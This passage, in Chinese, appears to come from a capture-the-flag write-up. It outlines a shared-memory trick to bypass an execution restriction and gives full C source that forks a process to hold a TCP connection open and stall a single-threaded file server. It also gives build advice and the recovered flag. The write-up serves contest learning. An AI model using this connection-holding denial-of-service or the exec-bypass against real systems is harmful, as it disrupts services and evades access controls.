思路大概是这样：
- 以只读方式，用 `shm_open()` 创建名叫 `getflag3` 但权限为 `777` 的 POSIX Shared Memory
- Fork 自己，然后让子进程以可读写的方式用 `shm_open()` 打开名叫 `getflag3` 的 POSIX shm，`ftruncate()` 扩展这片内存的空间，然后用 `mmap()` 将这片内存映射到自己的内存空间中。
- 让子进程打开 `/dev/shm/executable`，读取里面的内容，然后写入到 shm 中。子进程在这个时候就结束了。
- 此时只有原进程有以只读方式打开了 `/dev/shm/getflag3`，没有进程以可写的方式打开它。因此 `/dev/shm/getflag3` 可以被执行了。
- 原进程以带参数的方式执行 `/dev/shm/getflag3`, 这样新的进程获取到的 `argc` 是大于 1 的，正常执行 DBus 访问的代码。
- 获得 Flag！

事实上我一开始也是这样做的，因为想这个问题不会这么简单。也许在程序开始运行后，`/dev/shm` 是不可以以文件方式读写的。

这个思路是可以运行的！但确实略显得麻烦……所以在这里只把它贴出来，不会详细讲解。

## 动画分享
### 只要不停下 HTTP 服务，响应就会不断延伸
观察附件中的 Rust `fileserver` 代码，尽管没有找到会让 `fileserver` 崩溃的契机，但我们可以看到 `fileserver` 是以**完全同步**的方式运行的。也就是只会在处理完一个请求之后才会开始处理下一个请求。

在 `server.py` 中可以看到，我们的程序最多只会执行 10 秒就会被杀死，连接也会就此断开，而 HTTP Server 也得以处理下一个请求。我们也许需要让另一个进程来保持这个连接。

这里就可以使用 `fork()` 创建一个新的进程来保持连接了！原进程在 `fork()` 之后，等待新进程建立连接，然后退出。而新进程可以保持这个 TCP 连接不断开，即使不发送任何数据也是可行的。

下面是 C 源代码：
```c
#include <stdio.h>
#include <strings.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int pid = fork();
    if (pid != 0) {
        sleep(2);
        printf("subprocess %d spwaned, exiting.\n", pid);
        return 0;
    }
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("open socket fd failed.\n");
    }

    struct sockaddr_in addr;
    bzero(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(8000);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sockfd, (struct sockaddr*)(&addr), sizeof(addr)) != 0) {
        printf("connect failed.\n");
        return 0;
    }
    printf("connected\n");

    sleep(1000);
    printf("exit\n");
    return 0;
}
```

~~真的有人会直接用 C 写 TCP 吗？~~

注意上面的源代码如果直接使用 gcc 编译，上传运行可能会报错：
```plaintext
/dev/shm/executable: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /dev/shm/executable)
```

因此编译时需要加上 `--static` 选项。然后上传运行即可获得 Flag。

Flag 为 `flag{wa1t_no0O0oooO_mY_b1azIngfA5t_raust_f11r5erVer_bd4dc3991d}`。
